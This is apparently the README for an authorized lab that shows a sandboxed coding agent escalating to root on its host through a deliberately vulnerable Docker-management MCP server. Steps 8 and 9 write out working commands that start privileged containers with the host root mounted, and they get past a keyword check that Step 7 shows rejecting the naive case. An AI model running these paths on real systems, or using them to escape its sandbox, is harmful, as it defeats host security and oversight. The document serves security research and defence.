<!--
SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
SPDX-License-Identifier: Apache-2.0
-->

# docker-privesc — Docker socket privilege escalation via agent tool call

Wires roundhouse in front of a real coding agent (Claude Code, running inside a
genuine [NVIDIA/OpenShell](https://github.com/NVIDIA/OpenShell) sandbox) and
demonstrates, with a real marker file landing on the host filesystem, that **an
agent with access to a Docker management MCP server can escalate to root on the
host without calling `sudo`, without writing a privileged compose file to disk,
and without heredoc patterns visible to the host** — CWE-269 (Improper Privilege
Management) and CWE-78 (OS Command Injection via stdin pipe), both against a
deliberately vulnerable Docker Manager MCP server at
`labs/docker-privesc-lab/` in this repo.

This is authorized security research: a synthetic, CWE-labeled ground-truth lab
run against infrastructure the operator owns, with impact markers and a negative
control so every claim is a file on disk, not an assertion.

**Where roundhouse helps:** roundhouse routes the agent's reasoning-LLM calls
and provides a durable audit trail. The A/B comparison (local Qwen vs frontier
`claude-opus-5`) shows the exploit is architectural — it succeeds identically
regardless of which model authored the tool call, because the vulnerability is
in the Docker daemon trust model, not in any model's behavior.

## Architecture

```
┌──────────── Ubuntu 24.04 host (this machine, 1x H100) ──────────────────────┐
│                                                                               │
│  OpenShell gateway (native, systemd, mTLS, https://127.0.0.1:17670)          │
│                                                                               │
│   ┌─────────────── sandbox (real OpenShell sandbox) ──────────────────┐       │
│   │  claude (Claude Code CLI, standing in for OpenClaw agent)          │       │
│   │    │                                                               │       │
│   │    ├─▶ reasoning calls ─▶ roundhouse (:8080) ─▶ Qwen / Opus-5    │       │
│   │    │                                                               │       │
│   │    └─▶ docker-manage skill (manage.py, fastmcp Client)            │       │
│   │             │  DOCKER_MANAGER_MCP_URL=                             │       │
│   │             │  http://host.openshell.internal:8998/mcp             │       │
│   └─────────────┼──────────────────────────────────────────────────────┘       │
│                 │ MCP / streamable-http                                        │
│                 ▼                                                              │
│   docker-manager-mcp (docker, :8998, OUTSIDE the sandbox)                     │
│     VULN-01 run_container()  — CWE-269 (Path C: inline privileged flag)       │
│     VULN-02 apply_compose()  — CWE-269+CWE-78 (Path D: YAML via stdin)        │
│     [NEG]   run_named_compose() — validates, rejects privileged files          │
│     /var/run/docker.sock mounted → full Docker daemon access                  │
│                 │                                                              │
│                 ▼  privileged container with -v /:/host                       │
│   /tmp/DOCKER_PRIVESC_MARKER_<nonce>                                          │
│   ← proof of root-scope write OUTSIDE the sandbox, WITHOUT sudo               │
│                                                                                │
└────────────────────────────────────────────────────────────────────────────────┘
```

## Attack paths

| Path | Technique | Role | CWE |
|---|---|---|---|
| A | Existing privileged compose file → `run_named_compose` | **Negative control** — rejected by keyword validator | CWE-269 |
| C | `run_container(privileged=True, volumes={"/": ...})` | **Primary exploit** — inline params, no file write | CWE-269 |
| D | `apply_compose(yaml_str=...)` — YAML piped to `docker compose -f -` | **Primary exploit** — no file on disk, no heredoc on host | CWE-269+CWE-78 |

Path A proves keyword detection works on the naive case. Paths C and D bypass
it entirely — the privileged flag and host volume mount travel as JSON parameters
or as a compose YAML string in an MCP tool call, never touching the host
filesystem before the Docker daemon acts on them.

## Reproducing this

Run from `~/roundhouse/use-cases/docker-privesc/`. Needs three terminals (same
pattern as sandbox-breach — steps 2 and 3 are long-running foreground processes).

### Prerequisites (one-time)

```bash
# Mint turn keys (writes keys.local.json, gitignored)
cd ~/roundhouse/use-cases/docker-privesc
python3 mint_keys.py
```

### Step 1 — [Terminal 1] Docker Manager MCP server

```bash
cd ~/roundhouse/labs/docker-privesc-lab
docker compose -f docker-compose.docker-manager-mcp.yml up -d --build
```

Verify it is up:
```bash
docker logs docker-manager-mcp --tail 5
# expect: Uvicorn running on http://0.0.0.0:8998
```

### Step 2 — [Terminal 2, stays running] Local Dynamo/Qwen worker

```bash
# etcd + nats are required by Dynamo — start them first (idempotent, safe to re-run)
cd /home/ubuntu/dynamo && docker compose -f dev/docker-compose.yml up -d
sleep 3

source /home/ubuntu/dynamo/.venv/bin/activate
cd /home/ubuntu/roundhouse/use-cases/cache-aware-routing
MODEL=Qwen/Qwen2.5-7B-Instruct bash ./serve_model.sh serve
```

### Step 3 — [Terminal 3, stays running] roundhouse

```bash
export INFERENCE_API_KEY=...   # from ~/roundhouse/.env
export ROUNDHOUSE_CATALOG=/home/ubuntu/roundhouse/use-cases/docker-privesc/catalog.json
export ROUNDHOUSE_CONTROL_PLANE=/home/ubuntu/roundhouse/use-cases/docker-privesc/control-plane.json
export ROUNDHOUSE_ADDR=0.0.0.0:8080
export ROUNDHOUSE_FRONTIER_UPSTREAM=openai_responses
export ROUNDHOUSE_LOCAL_ENDPOINT=http://127.0.0.1:8000
export ROUNDHOUSE_LOCAL_MODEL=Qwen/Qwen2.5-7B-Instruct
export ROUNDHOUSE_LOCAL_TOKENIZER=/home/ubuntu/.cache/huggingface/hub/models--Qwen--Qwen2.5-7B-Instruct/snapshots/a09a35458c702b33eeacc393d103063234e8bc28/tokenizer.json
export ROUNDHOUSE_LOCAL_KV_EVENTS_ENDPOINT=tcp://127.0.0.1:20080
/home/ubuntu/roundhouse/target/release/roundhouse
```

Wait for `roundhouse listening addr=0.0.0.0:8080` before continuing.

### Step 4 — [Terminal 1] OpenShell gateway + CLI

```bash
curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh | sh
```

### Step 5 — [Terminal 1] roundhouse provider + sandbox

```bash
cd ~/roundhouse/use-cases/docker-privesc
openshell provider profile import -f openshell-roundhouse-provider.yaml --global
openshell provider create --name roundhouse --type roundhouse \
  --credential "ANTHROPIC_API_KEY=rh_sentinel_not_a_credential"
TURN_KEY=$(python3 -c "import json; print(json.load(open('keys.local.json'))['docker-privesc-frontier/openclaw-frontier'])")
openshell sandbox create --name docker-privesc-demo \
  --from ghcr.io/nvidia/openshell-community/sandboxes/base:latest \
  --provider roundhouse \
  --policy openshell-sandbox-policy.yaml \
  --env "ANTHROPIC_BASE_URL=http://host.openshell.internal:8080" \
  --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" \
  --no-credential-warnings --detach
```

### Step 6 — [Terminal 1] Upload skill + install deps

```bash
openshell sandbox upload docker-privesc-demo \
  ~/roundhouse/labs/docker-privesc-lab/openshell/skills/docker-manage /sandbox/.claude/skills/docker-manage
openshell sandbox exec -n docker-privesc-demo -- \
  /sandbox/.venv/bin/python3 -m pip install -q fastmcp
```

### Step 7 — [Terminal 1] Negative control (Path A — detected and rejected)

```bash
openshell sandbox exec -n docker-privesc-demo \
  --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
  python3 manage.py --tool run_named_compose --name dev-environment
# expect: [POLICY] Rejected: 'dev-environment.yml' contains 'privileged: true'
```


Flow:
```
openshell sandbox exec  →  manage.py (inside sandbox)  →  run_named_compose(name="dev-environment")
                                                                    ↓  MCP call to docker-manager-mcp (:8998)
                                                        server reads compose-files/dev-environment.yml from disk
                                                        detects "privileged: true" in file content
                                                                    ↓  keyword check fires — Docker never called
                                                        returns "[POLICY] Rejected: 'dev-environment.yml' contains 'privileged: true'"
```

The rejection is **not from OpenShell** — it is a hand-rolled keyword check inside `run_named_compose()` in the MCP server. OpenShell only executed `manage.py`; it has no visibility into the MCP tool calls or their payloads.

### Step 8 — [Terminal 1] Path C exploit — inline privileged flag, no file write

```bash
openshell sandbox exec -n docker-privesc-demo \
  --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
  python3 manage.py --tool run_container \
    --image alpine \
    --command "touch /host/tmp/DOCKER_PRIVESC_MARKER_path_c" \
    --privileged \
    --volumes '{"/" : {"bind": "/host", "mode": "rw"}}'
```

Flow:
```
openshell sandbox exec  →  manage.py (inside sandbox)  →  run_container(privileged=True, volumes={"/"...})
                                                                    ↓  MCP call to docker-manager-mcp (:8998)
                                                        docker SDK: client.containers.run(privileged=True, volumes={...})
                                                                    ↓  no file written, no keyword to scan
                                                        Docker daemon spawns privileged container with /:/host mounted
                                                                    ↓
                                                        container runs: touch /host/tmp/DOCKER_PRIVESC_MARKER_path_c
                                                                    ↓
                                                        /tmp/DOCKER_PRIVESC_MARKER_path_c appears on HOST (root-owned)
```

The dangerous config never existed as a file — it travelled as a JSON parameter inside the MCP HTTP request.

### Step 9 — [Terminal 1] Path D exploit — compose YAML piped via stdin

```bash
openshell sandbox exec -n docker-privesc-demo \
  --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
  python3 manage.py --tool apply_compose --yaml "
version: '3'
services:
  privesc:
    image: alpine
    privileged: true
    volumes:
      - /:/host
    command: touch /host/tmp/DOCKER_PRIVESC_MARKER_path_d
"
```

Flow:
```
openshell sandbox exec  →  manage.py (inside sandbox)  →  apply_compose(yaml_str="version: '3'...")
                                                                    ↓  MCP call to docker-manager-mcp (:8998)
                                                        subprocess.run(["docker", "compose", "-f", "-", ...],
                                                                       input=yaml_str.encode())
                                                                    ↓  YAML piped to stdin — never written to disk
                                                        Docker daemon parses YAML from stdin, spawns privileged container
                                                                    ↓
                                                        container runs: touch /host/tmp/DOCKER_PRIVESC_MARKER_path_d
                                                                    ↓
                                                        /tmp/DOCKER_PRIVESC_MARKER_path_d appears on HOST (root-owned)
```

The YAML existed only in memory — in the MCP server process — before Docker consumed it. No heredoc pattern, no file to scan on the host.

### Step 10 — [Terminal 1] Verify on the host

```bash
ls /tmp/DOCKER_PRIVESC_MARKER_*
# expect:
# /tmp/DOCKER_PRIVESC_MARKER_path_c
# /tmp/DOCKER_PRIVESC_MARKER_path_d
```

Flow:
```
ls /tmp/DOCKER_PRIVESC_MARKER_*   (runs directly on HOST, outside any sandbox)
        ↓
/tmp/DOCKER_PRIVESC_MARKER_path_c  ← written by Path C (JSON params → Docker SDK → privileged container)
/tmp/DOCKER_PRIVESC_MARKER_path_d  ← written by Path D (MCP string → stdin pipe → privileged container)
```

Both files are root-owned, written without any `sudo` call on the host and without any privileged config ever landing on the host filesystem before Docker acted on it.

Both markers appear in `/tmp/` on the **host** — written by processes the
sandboxed agent triggered, without `sudo`, without any privileged file written
to the host disk, without any heredoc pattern on the host side.

## Not yet done

- **End-to-end Claude Code run** — steps above exercise `manage.py` directly
  (`openshell sandbox exec`); a full agent run where Claude Code autonomously
  decides to call the docker-manage skill has not been verified yet.
- **Local Qwen leg** — steps 8–9 use the frontier turn key; the local leg
  (`docker-privesc-local/openclaw-local`) follows the same pattern with
  `TURN_KEY` set to the local key from `keys.local.json`.
